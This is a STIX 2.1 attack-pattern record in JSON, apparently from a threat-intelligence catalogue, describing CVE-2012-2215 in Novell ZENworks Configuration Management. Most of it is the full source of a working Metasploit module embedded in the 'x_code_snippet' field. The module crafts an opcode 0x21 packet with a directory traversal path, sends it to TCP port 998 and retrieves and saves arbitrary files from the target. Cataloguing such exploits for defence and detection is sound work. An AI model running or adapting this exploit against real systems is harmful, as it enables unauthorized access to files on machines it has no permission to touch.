{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2f3a84f-6482-47fa-a1af-e825d91dd035",
    "created": "2024-08-14T16:27:08.192421Z",
    "modified": "2024-08-14T16:27:08.192424Z",
    "name": "Novell ZENworks Configuration Management Preboot Service Remote File Access",
    "description": " This module exploits a directory traversal in the ZENworks Configuration Management. The vulnerability exists in the Preboot service and can be triggered by sending a specially crafted PROXY_CMD_FTP_FILE (opcode 0x21) packet to the 998/TCP port. This module has been successfully tested on Novell ZENworks Configuration Management 10 SP2 and SP3 over Windows.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/zenworks_preboot_fileaccess.rb",
            "external_id": "zenworks_preboot_fileaccess.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2215"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20121103122235/http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=975"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ZENworks Configuration Management Preboot Service Remote File Access',\n      'Description'    => %q{\n          This module exploits a directory traversal in the ZENworks Configuration Management.\n        The vulnerability exists in the Preboot service and can be triggered by sending a specially\n        crafted PROXY_CMD_FTP_FILE (opcode 0x21) packet to the 998/TCP port. This module has been\n        successfully tested on Novell ZENworks Configuration Management 10 SP2 and SP3 over Windows.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-2215' ],\n          [ 'OSVDB', '80230' ],\n          [ 'URL', 'https://web.archive.org/web/20121103122235/http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=975' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(998),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 6])\n      ])\n  end\n\n  def run_host(ip)\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"Please supply the name of the file you want to download\")\n      return\n    end\n\n    travs = \"\\\\..\" * datastore['DEPTH']\n    travs << \"\\\\\" unless datastore['FILEPATH'][0] == \"\\\\\"\n    travs << datastore['FILEPATH']\n\n    payload = Rex::Text.to_unicode(travs)\n    packet =  [0x21].pack(\"N\") # Opcode\n    packet << [payload.length].pack(\"N\") # Length\n    packet << payload # Value\n\n    connect\n    sock.put(packet)\n    sock.get_once(4, 1)\n    length = sock.get_once(4, 1)\n\n    unless length\n      print_error(\"Unable to get length due to a timeout\")\n      return\n    end\n\n    sock.get_once(0x210-8, 1)\n    contents = sock.get_once(length.unpack(\"V\").first, 1)\n\n    unless contents\n      print_error(\"Unable to extract contents due to a timeout\")\n      return\n    end\n\n    disconnect\n\n    print_good \"File retrieved successfully!\"\n    fname = File.basename(datastore['FILEPATH'])\n    path = store_loot(\n      'novell.zenworks_configuration_management',\n      'application/octet-stream',\n      ip,\n      contents,\n      fname\n    )\n    print_status(\"File saved in: #{path}\")\n  end\nend\n"
}